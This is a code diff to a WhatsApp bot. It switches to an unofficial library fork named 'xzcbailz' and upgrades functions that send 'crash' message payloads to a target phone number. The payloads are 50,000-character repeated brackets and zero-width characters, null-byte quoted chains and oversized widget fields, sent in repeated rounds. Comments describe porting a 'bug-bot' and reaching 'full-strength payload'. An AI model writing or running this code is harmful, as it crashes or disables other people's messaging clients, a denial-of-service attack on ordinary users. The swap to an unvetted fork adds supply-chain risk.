@@ -11,7 +11,7 @@ import makeWASocket, {
     downloadMediaMessage,
     prepareWAMessageMedia,
     generateWAMessageFromContent
-} from 'baileys';
+} from 'xzcbailz';
 import pino from 'pino';
 import express from 'express';
 import { createRequire } from 'module';
@@ -2531,9 +2531,9 @@ async function sendIozkProbe(prim, target) {
         }
     };
 
-    // Baileys v7 reserves `participant` for retry metadata shaped as
-    // { jid, count }; passing boolean true makes it call jidDecode(undefined).
-    await prim.relayMessage(target, payload, {});
+    // On the xzcbailz fork, participant: true = skip the bot's own devices
+    // (same as the original Squichy RX send).
+    await prim.relayMessage(target, payload, { participant: true });
     await delay(1000);
     return { inlineEntityChars: inlineEntities.length, encodedResponseBytes: Buffer.byteLength(responseJson) };
 }
@@ -2569,12 +2569,12 @@ async function sendFiosProbe(prim, target) {
 }
 
 // 🧪 TEMPORARY probe: the "fvckb1tch" hybrid from the obfuscated Squichy RX
-// case.js (crash-msg / crash-vis / crash-img / crash-expens). One round =
-// 10 payloads, 1s apart (faithful to the original loop). Note: our stock
-// Baileys proto lacks Header.bloksWidget and the groupStatusMentionMessage
-// messageAssociation field, so those two sub-payloads are dropped on encode —
-// the 10-deep null-byte quoted chain, real CDN image ref, and the 50k-char
-// title/subtitle/nativeFlow poison all encode and ship.
+// case.js (crash-msg / crash-vis / crash-img / crash-expens), FULL version.
+// This test repo runs the xzcbailz fork, whose proto has Header.bloksWidget
+// — so every sub-payload ships: groupStatusMentionMessage with the 50k-char
+// messageAssociation ID, 10-deep null-byte quoted chain, real CDN image ref,
+// bloksWidget poison, and 50k-char nativeFlow buttons. One round = 10
+// payloads, 1s apart (faithful to the original loop).
 async function sendCrashmsgProbe(prim, target) {
     // Chain of `depth` nested quoted messages, each carrying a null-byte text.
     // Recursive quote parsing on the target client is the new attack surface.
@@ -2590,6 +2590,11 @@ async function sendCrashmsgProbe(prim, target) {
         await prim.relayMessage(target, {
             viewOnceMessage: {
                 message: {
+                    groupStatusMentionMessage: {
+                        messageAssociation: {
+                            parentMessageKey: { id: '['.repeat(50000) }
+                        }
+                    },
                     interactiveMessage: {
                         contextInfo: { quotedMessage: quotedChain() },
                         header: {
@@ -2608,6 +2613,12 @@ async function sendCrashmsgProbe(prim, target) {
                                 directPath: '/o1/v/t24/f2/m232/AQPw3StiK4uxZZT4h_Dc2F8vjrOMvXcW5mebzpfMqsOqtSKkl016u8dENJXm-MyPm93HPklzjiZRWN2ClVtMtXa78-HfwAcAGcW1AFTQrA?ccb=9-4&oh=01_Q5Aa5gHZmbyqf-u6qIzMuyqBCu5J3hjJP_wpfXsaYx1ugYaHzQ&oe=6AE081EB&_nc_sid=e6ed6c',
                                 mediaKeyTimestamp: '1790520498',
                                 jpegThumbnail: ''
+                            },
+                            bloksWidget: {
+                                uuid: '\u200B'.repeat(50000),
+                                data: '['.repeat(50000),
+                                type: '\u200F'.repeat(50000),
+                                fallback: '\u200D'.repeat(50000)
                             }
                         },
                         body: { text: '\u000F' },
@@ -7099,11 +7110,9 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
 
         try {
             // ── PAYLOAD A: androz — interactiveMessage blobs (bloksWidget/null strings) ──
-            // Envelope note: the original bug-bot ran the `xzcbailz` fork, where
-            // { participant: true } merely skips CC'ing the bot's own devices —
-            // the target receives the same protobuf this normal relay sends
-            // (verified: SERVER_ACK + DELIVERY_ACK). The real weapon is volume
-            // (~1MB payloads × 100-300 at 30-70ms), handled by the count below.
+            // Fork build: { participant: true } skips the bot's own devices
+            // (exactly the original Squichy RX send), and the fork's proto
+            // encodes Header.bloksWidget — full-strength payload.
             async function androz(prim, target) {
                 await prim.relayMessage(target, {
                     groupStatusMessageV2: {
@@ -7126,7 +7135,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
                             }
                         }
                     }
-                }, {});
+                }, { participant: true });
             }
 
             // ── PAYLOAD B: testfff — carousel of 30 cards, null-byte button blobs ──
@@ -7164,6 +7173,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
                     {}
                 );
                 await prim.relayMessage(target, outMsg.message, {
+                    participant: true,
                     messageId: outMsg.key.id
                 });
             }
